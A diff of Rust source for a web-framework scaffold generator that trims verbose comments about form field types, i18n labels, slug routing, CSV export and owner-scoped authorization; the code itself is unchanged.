@@ -3141,10 +2583,8 @@ fn render_repository_file(
     let fragment_item_content = if api {
         "(self.id)".to_string()
     } else {
-        // Link through the routes module's typed path helper so the show URL
-        // has a single source of truth (issue #1133). This fragment lives in the
-        // repository module, so it reaches `paths::show` via the fully-qualified
-        // `crate::routes::{plural}::paths` path.
+        // The routes module's typed path helper is the single source of the show URL
+        // (issue #1133).
         format!("a href=(crate::routes::{plural}::paths::show(self.id)) {{ (self.id) }}")
     };
     let live_fragment_impl = if live {
@@ -3283,9 +2723,8 @@ fn render_model_form(
     validations: &BTreeMap<String, Vec<String>>,
     // The parent foreign-key column under `--belongs-to` (issue #1323).
     parent_fk: Option<&str>,
-    // Issue #1393: whether the CSV import surface is emitted. The only thing it
-    // changes here is that `parse_local_datetime` also accepts the format the
-    // CSV export writes, so an exported file re-imports on its datetime columns.
+    // Issue #1393: under `--import`, `parse_local_datetime` also accepts the CSV export's
+    // datetime format.
     import: bool,
     // The form field types must match the model's, which differ for
     // `Uuid`/`Decimal` on SQLite (issue #1924).
@@ -3299,16 +2738,12 @@ fn render_model_form(
 
     for f in fields {
         let name = &f.name;
-        // A required numeric carrying a `{min,max}` range (issue #1388) is
-        // represented as `Option<T>` on the form struct (issue #1748): a native
-        // `T` defaults to `0`, which pre-fills the input and passes both
-        // `required` (HTML) and `range` when the range spans the zero default,
-        // silently accepting a value the user never typed. `Option<T>` defaults
-        // to `None` (renders blank), and the `required` rule below rejects it.
+        // A required numeric with a `{min,max}` range (issue #1388) is `Option<T>` on the form
+        // (issue #1748): a native `T` pre-fills `0`, which passes `required` and any range
+        // spanning zero although the user never typed it.
         let is_constrained_required_numeric = is_constrained_required_numeric(f);
         if is_constrained_required_numeric {
-            // Emitted alongside the `range` rule so `None` is rejected
-            // server-side (a 422 with an inline error) rather than parsed as `0`.
+            // Rejects `None` server-side (a 422 with an inline error) instead of parsing `0`.
             let _ = writeln!(struct_fields, "    #[validate(required)]");
         }
         if let Some(rules) = validations.get(name) {
@@ -3316,30 +2751,19 @@ fn render_model_form(
                 let _ = writeln!(struct_fields, "    #[validate({rule})]");
             }
         }
-        // Issue #1323: under `--belongs-to` the nested inline create form
-        // renders no control for the parent foreign key (the parent is the URL),
-        // so a nested submission carries no value for it. `#[serde(default)]`
-        // turns that absence into an empty string the nested handler
-        // immediately overwrites from the path, instead of a "missing field"
-        // 400. The flat form still submits a real value through its select.
+        // Issue #1323: the nested create form has no control for the parent key (the URL
+        // carries it), so default it here; the nested handler overwrites it from the path.
         if parent_fk == Some(name.as_str()) {
             let _ = writeln!(struct_fields, "    #[serde(default)]");
         }
         if f.kind.is_attachment() {
-            // Zero-JS multipart uploads (issue #1236): the attachment is NOT a
-            // urlencodable form field, so it is excluded from `{Pascal}Form`
-            // entirely. `into_new` seeds the `New{Pascal}` blob column to `None`;
-            // the create/update handler streams the multipart file part to the
-            // blob store and binds the resulting `Blob` onto `new` afterwards
-            // (preserving the existing blob on an update with no new file). No
-            // struct field and no `from_row` seed: a file input can't be
-            // repopulated (browser security), and the stored attachment is
-            // rendered on the show view straight from the row.
+            // Issue #1236: an attachment is not a urlencodable field, so it has no form field.
+            // The handler streams the file part to the blob store and sets the column after
+            // `into_new`. No `from_row` seed: browsers do not let a file input be repopulated.
             let _ = writeln!(into_new, "        {name}: None,");
         } else if f.kind == FieldKind::Bool {
-            // Unchecked checkboxes are absent from submitted form data;
-            // `#[serde(default)]` maps that absence to `false` instead of a
-            // "missing field" 400.
+            // An unchecked checkbox is absent from the submission; `#[serde(default)]` makes
+            // that `false` instead of a "missing field" 400.
             if f.nullable {
                 let _ = writeln!(struct_fields, "    pub {name}: Option<bool>,");
             } else {
@@ -3351,13 +2775,9 @@ fn render_model_form(
             let _ = writeln!(into_new, "        {name}: form.{name},");
             let _ = writeln!(from_row, "            {name}: row.{name},");
         } else if f.kind == FieldKind::Bytea {
-            // `Vec<u8>` cannot deserialize from a single url-encoded value at
-            // all: `serde_urlencoded` hands each field's value to `serde` as a
-            // plain string, and `Vec<u8>`'s `Deserialize` impl expects a sequence.
-            // There is no raw-bytes HTML input widget either, so the form carries
-            // a `String` in `\x` + hex (issue #2330). UTF-8 is lossy for binary
-            // data: an edit-and-save would rewrite every non-UTF-8 byte. Hex is
-            // the same text the CSV export and import use.
+            // `serde_urlencoded` yields a string and `Vec<u8>` expects a sequence, so the form
+            // carries `\x` + hex (issue #2330), as the CSV export does. UTF-8 would be lossy:
+            // an edit-and-save would rewrite every non-UTF-8 byte.
             let bad_hex = format!(
                 ".map_err(|err| autumn_web::AutumnError::bad_request_msg(format!(\"{name}: {{err}}\")))?"
             );
@@ -3380,9 +2800,8 @@ fn render_model_form(
                 let _ = writeln!(from_row, "            {name}: bytea_to_hex(&row.{name}),");
             }
         } else if matches!(f.kind, FieldKind::NaiveDateTime | FieldKind::DateTime) {
-            // Represented as a `String` on the form (the browser's wire shape),
-            // so it always decodes and serializes cleanly for repopulation; the
-            // conversion parses it back to the model's datetime type.
+            // A `String` on the form (the browser's wire shape), so it always decodes;
+            // `into_new` parses it.
             needs_datetime = true;
             let to_utc = if f.kind == FieldKind::DateTime {
                 ".and_utc()"
@@ -3413,8 +2832,7 @@ fn render_model_form(
                 );
             }
         } else if let Some(enum_ty) = f.enum_type_name() {
-            // Decoded as a plain `String` then parsed via the enum's `FromStr`
-            // in `into_new` (an out-of-set value yields a 400 naming the field).
+            // Parsed in `into_new`; an out-of-set value is a 400 naming the field.
             let mut arms = String::new();
             for v in &f.variants {
                 let _ = write!(arms, "{enum_ty}::{} => \"{v}\".to_string(), ", pascal(v));
@@ -3445,16 +2863,9 @@ fn render_model_form(
                 );
             }
         } else if f.kind == FieldKind::Json {
-            // #1341 AC5: represented as a `String` on the form — the
-            // `<textarea>`'s wire shape, see `render_form_for_helper`'s
-            // `FieldControl::Textarea` override — so it always decodes.
-            // `into_new` parses it into `serde_json::Value`, which implements
-            // `FromStr<Err = serde_json::Error>`, and a bad value yields a 400
-            // naming the field, the same `bad_request_msg` pattern as the enum and
-            // datetime arms above rather than a 500. A blank optional textarea
-            // means "no value" (`None`), not invalid JSON, mirroring the
-            // nullable-`DateTime` blank-is-absent filter below; a blank required
-            // field is correctly rejected, since empty input is not valid JSON.
+            // #1341: a `String` on the form (the `<textarea>`'s wire shape); `into_new` parses
+            // it, and bad JSON is a 400 naming the field. A blank optional textarea is `None`;
+            // a blank required one is rejected as invalid JSON.
             if f.nullable {
                 let _ = writeln!(struct_fields, "    pub {name}: Option<String>,");
                 let _ = writeln!(
@@ -3478,15 +2889,8 @@ fn render_model_form(
                 let _ = writeln!(from_row, "            {name}: row.{name}.to_string(),");
             }
         } else if is_constrained_required_numeric {
-            // A required numeric with a `{min,max}` range (issue #1388) is
-            // `Option<T>` on the form struct (issue #1748). `validator`'s
-            // `range` rule applies to the inner value only when `Some`, so the
-            // range is still enforced server-side; `None` (the blank default)
-            // is rejected by the `#[validate(required)]` emitted above rather
-            // than parsed as `T::default()` (`0`). A native `T` here would
-            // pre-fill `0` and silently pass both `required` and a range that
-            // spans the zero default. `into_new` unwraps the validated
-            // `Some(_)`; `from_row` wraps a persisted native value in `Some`.
+            // `Option<T>`, as explained where `is_constrained_required_numeric` is bound above.
+            // `range` checks the inner value when `Some`; `#[validate(required)]` rejects `None`.
             let rust_type = f.rust_type_for(backend);
             let _ = writeln!(struct_fields, "    pub {name}: Option<{rust_type}>,");
             let _ = writeln!(
@@ -3508,16 +2912,9 @@ fn render_model_form(
                     | FieldKind::Time
             )
         {
-            // Represented as a `String` on the form, exactly like a required enum
-            // or datetime field. `T::default()` for these kinds — `0`, the nil
-            // UUID — is a real, plausible-looking value, not "blank": with a
-            // native-typed field the new form's changeset would render it as the
-            // input's pre-filled value (#1124 review), silently accepting a value
-            // the user never typed instead of forcing deliberate input the way the
-            // old hand-rolled form did, which emitted no `value` at all when blank.
-            // A nullable field of the same kind needs none of this:
-            // `Option<T>::default()` is `None`, which serializes to `null` and
-            // renders blank via `field_value`.
+            // A `String` on the form: `T::default()` (`0`, the nil UUID) looks like a real
+            // value and would pre-fill the new form, accepting input the user never typed
+            // (#1124). A nullable field defaults to `None`, which renders blank.
             let rust_type = f.rust_type_for(backend);
             let _ = writeln!(struct_fields, "    pub {name}: String,");
             let _ = writeln!(
@@ -3527,18 +2924,12 @@ fn render_model_form(
             );
             let _ = writeln!(from_row, "            {name}: row.{name}.to_string(),");
         } else {
-            // Issue #1326: a `:states(…)` state-machine column is transition-only,
-            // so the EDIT form omits its input (see `render_form_for_helper`) and
-            // the update submit carries no value for it. `#[serde(default)]` maps
-            // that absence to an empty string instead of a "missing field" 400 —
-            // harmless because the update `.set((…))` tuple excludes the column
-            // (`render_update_columns`), and the create form still submits the
-            // real initial state.
+            // Issue #1326: the edit form omits a state-machine column (it is transition-only),
+            // so default it. The update `.set((…))` excludes the column anyway.
             if f.state_machine.is_some() {
                 let _ = writeln!(struct_fields, "    #[serde(default)]");
             }
-            // Plain scalars (String/Text, and any nullable numeric/Uuid/Decimal)
-            // keep their native type — `Option<T>::default()` is already blank.
+            // Strings and nullable scalars keep their native type: the default is blank.
             let _ = writeln!(
                 struct_fields,
                 "    pub {name}: {rust_type},",
@@ -3555,10 +2946,6 @@ fn render_model_form(
          {struct_fields}}}"
     );
 
-    // `into_new` is always sync now (issue #1236): attachment blobs are streamed
-    // and bound in the handler, not resolved here, so no `&state`/`async` is
-    // needed. Attachment columns are seeded to `None` and overwritten by the
-    // handler after `into_new`.
     let into_new_fn = format!(
         "/// Convert the validated form into `New{pascal_name}` on the success\n\
          /// path. Enum/datetime parsing lives here (a bad value is a 400,\n\
@@ -3636,52 +3023,37 @@ fn render_routes_file(
     authorize: bool,
     owner: Option<&str>,
     searchable: &[String],
-    // Issue #1323: `Some` only under `--belongs-to`, which adds the nested
-    // read/create routes and the shared `children_section` the parent's own
-    // `show` view renders. `None` keeps every emission below byte-identical to
-    // the pre-#1323 flat scaffold.
+    // Issue #1323: `Some` only under `--belongs-to`, which adds the nested read/create
+    // routes and the `children_section` the parent's `show` view renders.
     nesting: Option<&super::nested::Nesting>,
-    // Issue #1393: `--import`. The CSV import surface decodes rows against the
-    // export's `CsvSchema` impl, so it is honoured only where that export is
-    // emitted — `import_enabled` below is this flag AND `export_enabled`. The
-    // caller warns when the flag was passed and could not be honoured.
+    // Issue #1393: `--import`. The import decodes rows against the export's `CsvSchema`, so
+    // `import_enabled` below also requires `export_enabled`.
     import: bool,
-    // Issue #1349: the seam every user-facing view string passes through.
-    // Disabled (`--i18n` off) it returns each caller's literal expression
-    // verbatim, so this whole template renders byte-for-byte as before.
+    // Issue #1349: every user-facing view string passes through here. Without `--i18n` it
+    // returns each caller's literal expression verbatim.
     labels: &scaffold_i18n::ViewLabels,
     // Selects the form field Rust types, which differ for `Uuid`/`Decimal` on
     // SQLite (issue #1924).
     backend: DatabaseBackend,
 ) -> String {
     let id_rust = id_type.rust_type();
-    // Issue #1349: with `--i18n`, every view-rendering handler takes the
-    // `Locale` extractor so the `t!` calls below have a `locale` in scope. It
-    // goes FIRST in every signature: `Locale` is a `FromRequestParts`
-    // extractor, and axum requires the single body-consuming (`FromRequest`)
-    // argument — `body: Bytes`, `Multipart` — to be last. Empty without the
-    // flag, keeping each signature byte-identical.
+    // Issue #1349: with `--i18n`, view handlers take `Locale` so `t!` has a `locale`. It goes
+    // first: axum requires the body-consuming extractor (`Bytes`, `Multipart`) to be last.
     let locale_param = if labels.enabled() {
         "locale: Locale,\n    "
     } else {
         ""
     };
-    // Same, for the handlers whose parameter lists are written inline on one
-    // line rather than one-per-line.
+    // Same, for handlers whose parameters are written on one line.
     let locale_param_inline = if labels.enabled() {
         "locale: Locale, "
     } else {
         ""
     };
-    // (Kept as empty strings so the handler/form templates below can splice a
-    // per-handler label prelude without a second set of conditionals.)
-    // Issue #1349: no `l_resource` binding any more — see `new_link_text`.
+    // Empty splice points the handler and form templates still reference.
     let resource_bind = String::new();
     let resource_bind_form = String::new();
-    // The three page-furniture strings every HTML index variant renders, and the
-    // create/edit chrome shared by the form views. Computed once so the six
-    // index templates and both search templates below stay literal-free without
-    // repeating the key/English pair eight times.
+    // Page chrome shared by every index variant and the form views, computed once.
     let index_title = labels.lit_ref(
         &format!("{snake_name}.index.title"),
         &format!("{pascal_name} index"),
@@ -3690,26 +3062,17 @@ fn render_routes_file(
         &format!("{snake_name}.name.plural"),
         &format!("{pascal_name}s"),
     );
-    // "New {Model}" is a per-resource key, NOT chrome with the noun passed in as
-    // a Fluent argument. Interpolating a noun into a sentence pattern is the
-    // classic i18n trap: French needs *Nouveau*/*Nouvelle* by gender, German
-    // *Neuer*/*Neue*/*Neues*, and Slavic languages inflect the noun itself — a
-    // translator handed `New { $resource }` cannot get any of that right from
-    // the bundle alone. One key per resource costs one extra line in `en.ftl`
-    // and is translatable. (The same reasoning the sibling `{snake}.delete.confirm`
-    // and `{snake}.trash.heading` keys already follow. `{ $id }` is fine to
-    // interpolate — a number carries no grammatical gender.)
+    // "New {Model}" is a per-resource key, not a shared pattern with the noun as a Fluent
+    // argument: the adjective must agree with the noun (French *Nouveau*/*Nouvelle*, German
+    // *Neuer*/*Neue*/*Neues*), which a translator of `New { $resource }` cannot see.
+    // `{ $id }` is fine to interpolate: a number has no gender.
     let new_link_text = labels.lit(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
     let new_link_markup =
         labels.markup(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
     let back_to_list = labels.lit("common.back", "Back to list");
     let back_to_list_markup = labels.markup("common.back", "Back to list");
     let edit_link_text = labels.lit("common.edit", "Edit");
-    // Create/edit form chrome. The `New {Pascal}` title is the SAME
-    // per-resource `{snake}.new` key the index link uses, for the reason given
-    // above: interpolating the model name into a shared pattern hands the
-    // translator a sentence whose article and adjective must agree with a noun
-    // they cannot see.
+    // Create/edit form chrome. The title reuses the per-resource `{snake}.new` key.
     let new_title = labels.lit_ref(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
     let new_heading = labels.markup(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
     let create_button = labels.lit("common.create", "Create");
@@ -3717,45 +3080,33 @@ fn render_routes_file(
     let save_button = labels.lit("common.save", "Save");
     let save_button_ref = labels.lit_ref("common.save", "Save");
     let delete_button = labels.markup("common.delete", "Delete");
-    // The shared `{snake}_form_for` helper renders every labeled control, so it
-    // needs the locale too. By reference — it only forwards it into `t!`-built
-    // `override_label` values, so there is nothing to own.
+    // The shared `{snake}_form_for` helper renders the labels, so it needs the locale too.
     let form_for_locale_arg = if labels.enabled() {
         "locale.clone(), "
     } else {
         ""
     };
-    // The generated routes module imports explicitly (no `prelude::*`), so the
-    // extractor and the macro both need naming. Both live behind autumn-web's
-    // `i18n` feature, which the plan enables on the project's Cargo.toml.
+    // The routes module imports explicitly (no `prelude::*`).
     let i18n_imports = if labels.enabled() {
         "use autumn_web::i18n::Locale;\nuse autumn_web::t;\n"
     } else {
         ""
     };
-    // Referenced two ways: the i18n `delete_confirm_js` JS-escaping `@let`
-    // (see the comment at its definition) uses `serde_json::to_string`, and
-    // `into_new`'s JSON-field arms (see `FieldKind::Json` below) parse into
-    // bare `serde_json::Value` — the base project template has no direct
-    // `serde_json` dependency, only autumn-web's re-export. Importing it
-    // unconditionally left every scaffold with neither i18n nor a JSON field
-    // (the documented, default case) with an unused import.
+    // Used by the i18n `delete_confirm_js` escaping and the JSON-field `into_new` arms.
+    // The project has no direct `serde_json` dependency, and an unused import would warn.
     let has_json_field = fields.iter().any(|f| f.kind == FieldKind::Json);
     let serde_json_import = if labels.enabled() || has_json_field {
         "use autumn_web::reexports::serde_json;\n"
     } else {
         ""
     };
-    // Empty-state copy. `DataTableConfig::new` takes `&str`, and the config is a
-    // temporary borrowed only for the `data_table(...)` call, so an inline
-    // `&t!(…)` is fine here — no binding needed.
+    // `DataTableConfig::new` borrows only for the `data_table(...)` call, so an inline
+    // `&t!(…)` needs no binding.
     let index_empty = labels.lit_ref(
         &format!("{snake_name}.index.empty"),
         &format!("No {plural} yet."),
     );
-    // The strings only the flag-gated surfaces render. Registered lazily so a
-    // scaffold without the flag never defines a key nothing references — which
-    // is exactly what `autumn i18n check` reports as unused.
+    // Registered only when rendered: `autumn i18n check` reports an unreferenced key.
     let (search_empty, search_box_placeholder) = if searchable.is_empty() {
         (String::new(), String::new())
     } else {
@@ -3770,18 +3121,10 @@ fn render_routes_file(
             ),
         )
     };
-    // The destructive button keeps its `window.confirm` guard, so the prompt travels
-    // through a JavaScript string literal — and a translation is not trusted input: it can
-    // come from a translator, a TMS, or a crowdsourced `.ftl`. Maud escapes the attribute
-    // value for HTML, but nothing escapes it for JS, so the encoding has to be exact.
-    //
-    // `serde_json::to_string` is that encoder: JSON string syntax is a subset of
-    // JavaScript's, and it escapes the quote, the backslash, and every control character.
-    // Hand-rolling `.replace('\'', "\\'")` is not enough — it leaves backslashes alone, so
-    // `C:\temp` smuggles in a tab, and a trailing `\` before an apostrophe escapes the
-    // generator's own escape and closes the string early, turning the rest of the
-    // translation into executable code. The emitted double quotes are HTML-escaped by Maud
-    // and un-escaped by the parser before JS ever sees them.
+    // The translated `window.confirm` prompt lands in a JavaScript string literal, and a
+    // translation is untrusted input. Maud escapes it for HTML only. `serde_json::to_string`
+    // escapes quotes, backslashes and control characters, and JSON strings are valid JS;
+    // escaping only `'` would let a trailing `\` close the string early.
     let delete_confirm_key = format!("{snake_name}.delete.confirm");
     let delete_confirm_ftl = format!("Delete this {pascal_name}?");
     let (delete_confirm_bind, delete_confirm_attr) = if labels.enabled() {
@@ -3799,11 +3142,8 @@ fn render_routes_file(
             format!("\"return confirm('Delete this {pascal_name}?')\""),
         )
     };
-    // `--searchable` only. Registered lazily so a non-searchable scaffold never
-    // writes these keys into `en.ftl` (an unreferenced key is exactly what
-    // `autumn i18n check` reports as unused). `{snake}.search.title` serves the
-    // page `<h1>`, the `<title>`, and the search input's visible label — they
-    // are the same words naming the same thing, so one key keeps them in step.
+    // `--searchable` only, so no unreferenced key is registered. One key serves the `<h1>`,
+    // the `<title>` and the search input's label.
     let (search_title, search_heading, search_box_label) = if searchable.is_empty() {
         (String::new(), String::new(), String::new())
     } else {
@@ -3822,50 +3162,31 @@ fn render_routes_file(
             ),
         )
     };
-    // #1260: a `slug` field reroutes `show`, `edit`, `update`, and `delete`, and their
-    // generated links, to key off the slug instead of `id`. The
-    // `plan_scaffold_with_options_impl` gate above ensures a slug never coexists with
-    // `--live`, `--live-validation`, `--sharded`, an `Attachment` field, or a
-    // `:states(...)` field, so every one of those branches below is unreachable whenever
-    // `route_key_field` is `Some` and needs no changes. When `route_key_field` is `None` —
-    // the common case of no slug field — every helper below reduces to exactly the
-    // pre-#1260 text, so a non-slug scaffold's output is byte-for-byte unchanged.
+    // #1260: a `slug` field keys `show`, `edit`, `update` and `delete`, and their links, off
+    // the slug instead of `id`. `plan_scaffold_with_options_impl` refuses a slug with
+    // `--live`, `--live-validation`, `--sharded`, an attachment or a `:states(...)` field,
+    // so those branches below never see a slug.
     let slug_field: Option<&Field> = fields.iter().find(|f| f.kind.is_slug());
     let route_key_field: Option<&str> = slug_field.map(|f| f.name.as_str());
-    // The `id`/`slug` parameter declaration for a `show`/`edit`/`update`/
-    // `delete` handler signature — substitutes in place of the pre-#1260
-    // literal `id: Path<{id_rust}>` text.
+    // The route-key parameter of the `show`/`edit`/`update`/`delete` handlers.
     let id_param_decl: String = route_key_field.map_or_else(
         || format!("id: Path<{id_rust}>"),
         |_| format!("Path({ROUTE_KEY_BINDING}): Path<String>"),
     );
-    // The URL path segment name for those same four routes.
     let id_url_segment: &str = route_key_field.unwrap_or("id");
-    // The `{plural}::table` row lookup — substitutes in place of the
-    // pre-#1260 literal `.find(*id)` (dot kept in the surrounding template).
+    // The row lookup, without the leading dot (the template has it).
     let find_expr: String = route_key_field.map_or_else(
         || "find(*id)".to_owned(),
         |f| format!("filter({plural}::{f}.eq(&{ROUTE_KEY_BINDING}))"),
     );
-    // The value expression used everywhere a route handler builds a
-    // `paths::*`/error-message argument identifying the row it just loaded —
-    // substitutes in place of the pre-#1260 literal `*id`.
+    // Identifies the loaded row in `paths::*` calls and error messages.
     let id_value_expr: String =
         route_key_field.map_or_else(|| "*id".to_owned(), |_| format!("&{ROUTE_KEY_BINDING}"));
-    // Same, but for a loaded `row: {pascal_name}` value rather than the path
-    // extractor local — substitutes in place of the pre-#1260 literal `row.id`
-    // wherever a view displays or links the record it just rendered. Borrows
-    // (`&row.{f}`) rather than reading `row.{f}` by value: unlike `row.id`
-    // (`i64`, `Copy`), a slug is a non-`Copy` `String` field, and every
-    // substitution site below already accepts `impl Display`/`Render` on a
-    // reference, so borrowing here avoids depending on happening to be the
-    // last use of `row` in the surrounding handler.
+    // Same, read from a loaded `row`. Borrowed: a slug is a non-`Copy` `String`, and moving
+    // it out would depend on this being the last use of `row`.
     let route_key_display_expr: String =
         route_key_field.map_or_else(|| "row.id".to_owned(), |f| format!("&row.{f}"));
-    // Issue #1349: the detail page's title and heading both render
-    // "{Model} #{key}". The Fluent value interpolates the key rather than
-    // concatenating around it, so a translation can place it wherever its
-    // language puts it.
+    // Issue #1349: "{Model} #{key}" interpolates the key so a translation can place it.
     let show_title_key = format!("{snake_name}.show.title");
     let show_title_ftl = format!("{pascal_name} #{{ $id }}");
     let show_id_arg = format!("&({route_key_display_expr}).to_string()");
@@ -3881,9 +3202,8 @@ fn render_routes_file(
         &format!("\"{pascal_name} #\" ({route_key_display_expr})"),
         &[("id", &show_id_arg)],
     );
-    // The `:states(...)` variant renders the same page from a shared `show_view`
-    // helper, which is always `id`-keyed (a slug column and a state-machine
-    // column are refused together upstream).
+    // The `:states(...)` variant's `show_view` helper is always `id`-keyed: a slug and a
+    // state machine are refused together.
     let show_view_title = labels.expr_ref(
         &show_title_key,
         &show_title_ftl,
@@ -3896,11 +3216,8 @@ fn render_routes_file(
         &format!("\"{pascal_name} #\" (row.id)"),
         &[("id", "&row.id.to_string()")],
     );
-    // The edit form's title/heading. Keyed per-resource because the English
-    // carries the model's own name; the row key is a Fluent argument so a
-    // translation can position it. Two shapes: the standard form keys off
-    // `{id_value_expr}` (a slug column reroutes it), the live-validation form
-    // always off `*id`.
+    // The edit form's title/heading. The standard form keys off `id_value_expr` (a slug may
+    // reroute it); the live-validation form always uses `*id`.
     let edit_title_key = format!("{snake_name}.edit.title");
     let edit_title_ftl = format!("Edit {pascal_name} #{{ $id }}");
     let edit_id_arg = format!("&({id_value_expr}).to_string()");
@@ -3928,10 +3245,8 @@ fn render_routes_file(
         &format!("\"Edit {pascal_name} #\" (*id)"),
         &[("id", "&(*id).to_string()")],
     );
-    // `show_view` is a plain helper, not a handler, so it takes the locale as an
-    // ordinary argument — BY VALUE. `t!` expands to `Locale::t(&locale, …)`, and
-    // a `&Locale` binding would make that a `&&Locale` the signature rejects.
-    // `Locale` is a cheap clone: a tag string plus an `Arc` to the shared bundle.
+    // `show_view` takes the locale by value: `t!` expands to `Locale::t(&locale, …)`, and a
+    // `&Locale` binding would make that a `&&Locale`. Cloning is cheap (a tag and an `Arc`).
     let (show_view_locale_param, show_view_locale_arg, show_view_locale_arg_multiline) =
         if labels.enabled() {
             (
@@ -3942,61 +3257,36 @@ fn render_routes_file(
         } else {
             ("", "", "")
         };
-    // The value the `update` handler's SUCCESS redirect resolves the row
-    // by — unlike `id_value_expr` (the path extractor's PRE-update value,
-    // still correct for the not-found message above it), this must read the
-    // just-persisted `new.{f}` for a slug: if the user edited (or blanked,
-    // triggering re-derivation of) the slug, redirecting to the OLD path
-    // value 404s (issue #1260 review finding). `id` never changes on
-    // update, so the non-slug case stays the pre-#1260 `*id`.
+    // The `update` success redirect reads the persisted `new.{f}`: an edited or re-derived
+    // slug makes the path's old value 404 (issue #1260). `id` never changes.
     let update_redirect_expr: String =
         route_key_field.map_or_else(|| "*id".to_owned(), |f| format!("&new.{f}"));
-    // Issue #1319: the full-text search box + results handler apply only to the
-    // standard (non-live) HTML index. The `--live`/`--live-validation` list is a
-    // `<ul>` with an SSE out-of-band swap contract that a `data_table` search
-    // fragment would break, so gate the search box off for those variants (the
-    // model/repository/migration still get `searchable`). Precedent: the label
-    // -map gating for the live index.
+    // Issue #1319: the live list is a `<ul>` with an SSE out-of-band swap contract that a
+    // `data_table` search fragment would break. The model and repository still get
+    // `searchable`.
     let search_enabled = !searchable.is_empty() && !live && !live_validation;
-    // Issue #1312: bulk-select + `POST /{plural}/bulk_delete`. Emitted only for
-    // the standard HTML list. `--live`/`--live-validation` own their list DOM
-    // through an SSE/htmx out-of-band swap contract that a wrapping `<form>` and
-    // an extra checkbox column would break, and the `--sharded` repository has no
-    // cross-shard `delete_many` to route a mixed selection through — so those
-    // three variants stay byte-identical to their pre-#1312 output. (`--api`
-    // emits no HTML routes file at all, so it needs no gate here.)
+    // Issue #1312: bulk delete. A wrapping `<form>` would break the live list's swap
+    // contract, and the sharded repository has no cross-shard `delete_many`.
     let bulk_delete_enabled = !live && !live_validation && !sharded;
     let validated_fields: Vec<&str> = validations.keys().map(String::as_str).collect();
     let unique_fields: Vec<&Field> = fields.iter().filter(|f| f.unique).collect();
-    // Issue #1326: fields carrying a `:states(…)` state machine. Only these
-    // scaffolds emit a `show_view` helper, per-field `transition_controls`, and a
-    // `POST /{plural}/{{id}}/transitions/{field}` handler. A scaffold with none
-    // (the overwhelming common case) keeps the pre-#1326 output byte-identical.
+    // Issue #1326: these get a `show_view` helper, `transition_controls` and a
+    // `POST /{plural}/{{id}}/transitions/{field}` handler.
     let sm_fields: Vec<&Field> = fields
         .iter()
         .filter(|f| f.state_machine.is_some())
         .collect();
     let has_state_machine = !sm_fields.is_empty();
-    // Issue #1318: the optimistic-locking column, read from `all_fields` —
-    // `fields` is the FORM field list, and `lock_version` is deliberately absent
-    // from it (the version is carried in a hidden input, never as an editable
-    // control; see `plan_scaffold`'s `form_fields` filter). `None` for the
-    // overwhelming common case, which keeps every emission below byte-identical
-    // to the pre-#1318 output.
+    // Issue #1318: read from `all_fields`, since `fields` (the form fields) omits
+    // `lock_version`; it travels in a hidden input.
     let lock_version: Option<&Field> = super::model::lock_version_field(all_fields);
     // The Rust type of the version counter (`i32`/`i64`), used for the hidden
     // field's parse target and the shared `form_for` helper's parameter.
     let lock_version_ty: String = lock_version.map(Field::rust_type).unwrap_or_default();
     let update_columns = render_update_columns(plural, fields);
     let nullable_field_match = render_nullable_field_match(fields);
-    // With no nullable (or synthetic constrained-required-numeric) fields,
-    // `render_nullable_field_match` renders a bare `false` that never reads
-    // its `name` argument — the overwhelmingly common case for a first
-    // scaffold, since every documented example field is required. Name the
-    // parameter `_name` in exactly that case so the generated helper compiles
-    // without an unused-variable warning; every other case still binds `name`,
-    // matching the `matches!(name, ...)` body `render_nullable_field_match`
-    // emits.
+    // With no nullable (or constrained required numeric) field, the generated match is a
+    // bare `false`, so `_name` avoids an unused-variable warning.
     let nullable_form_field_param = if fields
         .iter()
         .any(|f| f.nullable || is_constrained_required_numeric(f))
@@ -4006,81 +3296,41 @@ fn render_routes_file(
         "_name"
     };
     let has_attachments = has_attachment_fields(fields);
-    // Issue #1125/#1830: inline record-level authorization on the mutating HTML
-    // handlers + owner-scoped index. The caller sets `authorize` whenever an
-    // owner column exists, on EVERY variant. Attachment scaffolds already thread
-    // a `state: State<AppState>` param through `create`/`update` (for the
-    // multipart upload), so those two handlers reuse it rather than injecting a
-    // second, conflicting `State` extractor — see `create_update_authz_params` /
-    // `create_update_state_expr` below.
-    // The owner column name (`user_id`/`author_id`/`owner_id`/a users FK). Only
-    // read when `owner_scoped_index` is set (so the caller passed `Some`).
+    // Issues #1125/#1830: record-level authorization on the mutating HTML handlers and an
+    // owner-scoped index. `owner_col` is read only when `owner_scoped_index` is set, so
+    // `owner` is `Some` there.
     let owner_col = owner.unwrap_or("user_id");
-    // Issue #1830: the index is owner-scoped only when an owner column exists. A
-    // no-owner scaffold still record-authorizes its mutating handlers (`authorize`
-    // is set), but its index cannot filter by owner, so it keeps the unscoped
-    // listing.
+    // Issue #1830: without an owner column the handlers still authorize, but the index
+    // cannot filter by owner.
     let owner_scoped_index = authorize && owner.is_some();
-    // Issue #1841: the STANDARD (non-live, non-live-validation, non-sharded) Db
-    // owner path is the only one whose repository carries `owner = <col>` (see
-    // `render_repository_file`), so it is the only one whose index/search can call
-    // the macro's owner-filtered `list_scoped` / `search_page_scoped`. That path
-    // gets the sort/filter data_table + the search box, both safely scoped to the
-    // current user. The `--sharded`/`--live`/`--live-validation` owner indexes
-    // keep the #1830 manual owner-filtered query (no scoped repo methods emitted).
+    // Issue #1841: only the standard owner path's repository carries `owner = <col>`, so
+    // only it can call `list_scoped`/`search_page_scoped`. The sharded and live owner
+    // indexes keep a hand-written owner-filtered query.
     let owner_scoped_standard = owner_scoped_index && !sharded && !live && !live_validation;
-    // #1315: the `GET /{plural}/export.csv` download and the index's "Export CSV" link.
-    // Emitted exactly where the index's row set is a repository call the export can reuse
-    // — `repo.list_scoped` on the owner-scoped standard index, `repo.list` on the plain
-    // one. The export calls their count-free siblings, `list_scoped_rows`/`list_rows`
-    // (#2185), which the macro builds from the same filters. That is the whole security
-    // argument for AC5: the export never re-derives a row set of its own, so it cannot
-    // widen past what the index already shows.
+    // #1315: `GET /{plural}/export.csv`. Emitted only where the index lists through a
+    // repository call (`list_scoped` or `list`): the export uses their count-free siblings
+    // (#2185), so it can never return rows the index does not show.
     //
-    // Gated off for `--live`, an SSE `<ul>` on `repo.page` with no `ListQuery` to honour;
-    // for `--sharded`, where `from_shard` pins the query to one shard so an "export
-    // everything" file would silently cover a fraction of the table; and for the
